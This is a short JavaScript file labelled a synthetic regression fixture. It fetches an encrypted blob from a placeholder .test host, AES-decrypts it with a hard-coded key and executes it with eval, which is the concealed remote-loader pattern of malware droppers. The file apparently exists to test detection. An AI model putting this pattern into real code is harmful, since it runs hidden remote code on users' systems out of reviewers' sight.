// Synthetic regression fixture: a fetched blob is AES-decrypted and eval'd.
const axios = require('axios');
const CryptoJS = require('crypto-js');

const KEY = 'fixture-static-key';

function loadRemoteModule() {
  axios.get('https://cdn.example-desk.test/app.enc').then((response) => {
    const code = CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(response.data, KEY));
    eval(code);
  });
}

module.exports = { loadRemoteModule };
